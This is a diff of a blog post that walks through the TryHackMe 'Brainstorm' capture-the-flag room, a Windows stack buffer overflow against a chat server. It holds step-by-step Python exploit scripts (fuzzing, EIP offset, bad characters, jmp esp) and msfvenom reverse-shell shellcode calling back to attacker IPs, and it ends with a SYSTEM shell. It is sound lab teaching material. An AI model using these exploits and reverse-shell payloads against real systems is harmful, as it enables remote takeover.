@@ -26,8 +26,7 @@ Everyone put your thinking caps on!  Time to take on Brainstorm.
 
 Run nmap to get a list of services running on the top ports.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
 └─$  sudo nmap -sC -sV -A -O -oN nmap -Pn 10.10.134.44
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-26 02:07 AEDT
@@ -55,14 +54,13 @@ PORT     STATE SERVICE    VERSION
 |_    Please enter your username (max 20 characters):
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Enumerate the FTP and download the chatserver.exe and essfunc.dll files.
 
-{% raw %}
-```bash
+{% capture enumerateftp %}
 root@ip-10-10-84-177:~/Rooms/brainstorm# ftp 10.10.134.44
 Connected to 10.10.134.44.
 220 Microsoft FTP Service
@@ -98,8 +96,8 @@ local: essfunc.dll remote: essfunc.dll
 125 Data connection already open; Transfer starting.
 226 Transfer complete.
 30761 bytes received in 0.00 secs (17.1555 MB/s)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=enumerateftp %}
 
 <br />
 Set-up a Windows machine run Windbg, with the narly extension, and tranfer the binary we found to the lab machine.
@@ -131,8 +129,7 @@ Get the Windows IP address so we can connect to the new service.
 <br />
 Use netcat to interact with the service so we can get an idea of the normal operations.
 
-{% raw %}
-```bash
+{% capture ncservice %}
 ┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
 └─$ nc 192.168.20.23 9999
 Welcome to Brainstorm chat (beta)
@@ -185,14 +182,13 @@ Wed Feb 26 06:16:30 2025
 
 
 Write a message:
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ncservice %}
 
 <br />
 Create a python script that connects to the service normally so we can break it later.
 
-{% raw %}
-```python
+{% capture exploit00 %}
 import socket
 
 ip = '192.168.20.23'
@@ -211,14 +207,13 @@ s.send(b'This is a test message\r\n')
 print(s.recv(1024))
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='brainstorm_0x00.py' content=exploit00 %}
 
 <br />
 Update the script to fuzz the message prompt with increasing longer payloads to find the size that breaks.
 
-{% raw %}
-```python
+{% capture exploit01 %}
 import socket
 
 ip = '192.168.20.23'
@@ -245,14 +240,13 @@ for inputBuffer in buffers:
     s.recv(1024)
 
     s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='brainstorm_0x01.py' content=exploit01 %}
 
 <br />
 Run the script and note the size at which the script hangs.
 
-{% raw %}
-```bash
+{% capture run01 %}
 ========= RESTART: /home/kali/Documents/thm/brainstorm/thm-bof_0x01.py =========
 [*] Sending: 1
 [*] Sending: 100
@@ -266,8 +260,8 @@ Run the script and note the size at which the script hangs.
 [*] Sending: 1700
 [*] Sending: 1900
 [*] Sending: 2100
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=run01 %}
 
 <br />
 Check Windbg to ensure that our As (\x41s) overtake the EIP register.
@@ -281,8 +275,7 @@ Check Windbg to ensure that our As (\x41s) overtake the EIP register.
 <br />
 Update the script to remove the fuzzer and hardcode the break value.
 
-{% raw %}
-```python
+{% capture exploit02 %}
 import socket
 
 ip = '192.168.20.23'
@@ -308,8 +301,8 @@ try:
     s.close()
 except:
     print('[-] The exploit failed')
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='brainstorm_0x02.py' content=exploit02 %}
 
 <br />
 Run the script and double-check Windbg to ensure that we still have control of EIP.
@@ -332,19 +325,17 @@ Check the ESP to see where the rest of the payload value.
 <br />
 Use the msf-pattern_create to create a unique pattern.  This will (eventually) give us the offset to be able to fully control the EIP.
 
-{% raw %}
-```bash
+{% capture msfpatterncreate %}
 ┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
 └─$ msf-pattern_create -l 2100
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=msfpatterncreate %}
 
 <br />
 Update that script with that pattern and run the script.
 
-{% raw %}
-```python
+{% capture exploit03 %}
 import socket
 
 ip = '192.168.20.23'
@@ -371,8 +362,8 @@ try:
     s.close()
 except:
     print('[-] The exploit failed')
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='brainstorm_0x03.py' content=exploit03 %}
 
 <br />
 Check the value in EIP and note the unique value.
@@ -386,19 +377,17 @@ Check the value in EIP and note the unique value.
 <br />
 Run the msf-pattern_offset with the query value from EIP to get the exact offset to be able to overwrite EIP.
 
-{% raw %}
-```bash
+{% capture msfpatternoffset %}
 ┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
 └─$ msf-pattern_offset -l 2100 -q 31704330
 [*] Exact match at offset 2012
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=msfpatternoffset %}
 
 <br />
 Update the code with the hardcoded offset value.
 
-{% raw %}
-```python
+{% capture exploit04 %}
 import socket
 from struct import pack
 
@@ -429,8 +418,8 @@ try:
     s.close()
 except:
     print('[-] The exploit failed')
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='brainstorm_0x04.py' content=exploit04 %}
 
 <br />
 Check Windbg.  We should see the Bs (42s) in the EIP register.
@@ -444,8 +433,7 @@ Check Windbg.  We should see the Bs (42s) in the EIP register.
 <br />
 Update the code to have all of the possible hex values so we can test for bad characters.  We will exclude \x00 since it is usually a bad character anyways.  Add 400 to the payload size.  Sometimes when you increase the size you mess with execution.  So we will have to double-check to ensure that we still have control of EIP.  Run the code.
 
-{% raw %}
-```python
+{% capture exploit05 %}
 import socket
 
 ip = '192.168.20.23'
@@ -469,7 +457,7 @@ badchars = (
   b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
   b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
   b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
-  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf
+  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
     print('[*] Connecting to program')
     s.connect((ip,port))
     s.recv(1024)
@@ -484,7 +472,7 @@ badchars = (
     print('[*] Check the listener')
     s.close()
 except:
-    print('[-] The exploit failed')7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+    print('[-] The exploit failed')
 )
 
 inputBuffer = badchars
@@ -510,8 +498,8 @@ try:
     s.close()
 except:
     print('[-] The exploit failed')
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='brainstorm_0x05.py' content=exploit05 %}
 
 <br />
 Check the EIP Payload to ensure we have enough Cs for our payload.  We also still have control of EIP.  Nice.
@@ -534,8 +522,7 @@ Check EAX for our hex values.  They all appear to be there so we should be good 
 <br />
 Update the code to return to normal execution with a shell payload.
 
-{% raw %}
-```python
+{% capture exploit06 %}
 import socket
 
 ip = '192.168.20.23'
@@ -568,20 +555,19 @@ try:
     s.close()
 except:
     print('[-] The exploit failed')
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='brainstorm_0x06.py' content=exploit06 %}
 
 <br />
 Use the msf-nasm_shell shell to get the opcode equivalent for jmp esp.
 
-{% raw %}
-```bash
+{% capture msfnasmshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
 └─$ msf-nasm_shell                        
 nasm > jmp esp
 00000000  FFE4              jmp esp
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=msfnasmshell %}
 
 <br />
 In WinDBG, load the narly module.
@@ -622,8 +608,7 @@ Reset WinDbg and set a break-point on the address that we chose.
 <br />
 Update the code with the memory address in the EIP space.  Run the code.
 
-{% raw %}
-```python
+{% capture exploit07 %}
 import socket
 from struct import pack
 
@@ -657,8 +642,8 @@ try:
     s.close()
 except:
     print('[-] The exploit failed')
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='brainstorm_0x07.py' content=exploit07 %}
 
 <br />
 Check WinDbg and ensure that we caught the jmp ESP breakpoint.
@@ -681,8 +666,7 @@ Step one more time to see the code jump into esp.  We should see the Cs (43s).
 <br />
 Run msfvenom to generate a payload.
 
-{% raw %}
-```bash
+{% capture genpayload %}
 ┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.20.20 LPORT=443 -f python -b '\x00'
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -724,14 +708,13 @@ buf += b"\xf0\x85\xef\xc7\xec\x35\x0f\x12\xb5\x46\x5a\x3e"
 buf += b"\x9c\xce\x03\xab\x9c\x92\xb3\x06\xe2\xaa\x37\xa2"
 buf += b"\x9b\x48\x27\xc7\x9e\x15\xef\x34\xd3\x06\x9a\x3a"
 buf += b"\x40\x26\x8f"
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=genpayload %}
 
 <br />
 Update the python code to use the payload we just generated.  Make sure to include the nop sled.
 
-{% raw %}
-```python
+{% capture exploit08 %}
 import socket
 from struct import pack
 
@@ -796,43 +779,46 @@ try:
     s.close()
 except:
     print('[-] The exploit failed')
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='brainstorm_0x08.py' content=exploit08 %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture start443listenerlocal %}
 ┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start443listenerlocal %}
 
 <br />
 Run the script and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchlocalshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
 └─$ sudo nc -nlvp 443 
 [sudo] password for kali: 
 listening on [any] 443 ...
 connect to [192.168.20.20] from (UNKNOWN) [192.168.20.24] 50648
+{% endcapture %}
+
+{% capture windowslocalshell %}
 Microsoft Windows [Version 10.0.19045.3803]
 (c) Microsoft Corporation. All rights reserved.
 
 C:\Program Files\Windows Kits\10\Debuggers>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catchlocalshell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=windowslocalshell %}
 
 <br />
 Run msfvenom (again) to generate a payload with the TryHackMe IP address.
 
-{% raw %}
-```bash
+{% capture genremotepayload %}
 ┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.4.119.29 LPORT=443 -f python -b '\x00'
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -874,14 +860,13 @@ buf += b"\xfd\x79\xb8\x93\xe3\x19\x47\x4e\xa0\x2a\x02\xd2"
 buf += b"\x81\xa2\xcb\x87\x93\xae\xeb\x72\xd7\xd6\x6f\x76"
 buf += b"\xa8\x2c\x6f\xf3\xad\x69\x37\xe8\xdf\xe2\xd2\x0e"
 buf += b"\x73\x02\xf7"
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=genremotepayload %}
 
 <br />
 Update the script with the new payload and victim machine IP address.
 
-{% raw %}
-```python
+{% capture exploit09 %}
 import socket
 from struct import pack
 
@@ -946,29 +931,30 @@ try:
     s.close()
 except:
     print('[-] The exploit failed')
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='brainstorm_0x09.py' content=exploit09 %}
 
 <br />
 Reset the listener.
 
-{% raw %}
-```bash
+{% capture reset443listener %}
 ┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
 └─$ sudo nc -nlvp 443
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=reset443listener %}
 
 <br />
 Catch the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchremoteshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
 └─$ sudo nc -nlvp 443
 listening on [any] 443 ...
 connect to [10.4.119.29] from (UNKNOWN) [10.10.214.139] 49180
+{% endcapture %}
+
+{% capture windowsremoteshell %}
 Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
@@ -977,14 +963,16 @@ whoami
 nt authority\system
 
 C:\Windows\system32>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catchremoteshell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=windowsremoteshell %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 C:\Users\drake\Desktop>type root.txt
 type root.txt
 <redacted>
@@ -1006,8 +994,8 @@ Tunnel adapter isatap.eu-west-1.compute.internal:
 
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . : eu-west-1.compute.internal
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=rootflag %}
 
 <br />
 And with that we wrapped up another one.  Thanks for reading.  See you in the next one.
